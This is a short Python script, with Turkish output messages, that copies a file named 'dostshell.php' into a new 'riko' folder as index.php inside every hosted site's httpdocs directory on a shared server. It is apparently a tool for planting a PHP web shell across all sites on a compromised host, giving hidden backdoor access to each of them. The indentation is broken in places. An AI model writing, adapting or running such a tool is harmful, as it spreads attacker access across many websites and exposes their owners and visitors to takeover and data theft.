import glob
import os
import shutil

source_file = '/var/www/vhosts/dostshell.php'

for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
    try:

              new_folder = os.path.join(target_dir, 'riko')
        

          os.makedirs(new_folder, exist_ok=True)
        

        new_file_path = os.path.join(new_folder, 'index.php')
        

        shutil.copy(source_file, new_file_path)
        
        print(f"{source_file}, {new_file_path} olarak kopyalandi.")
    
    except Exception as e:
        print(f"Hata: {target_dir} icinde dosya olusturulamadı. {e}")
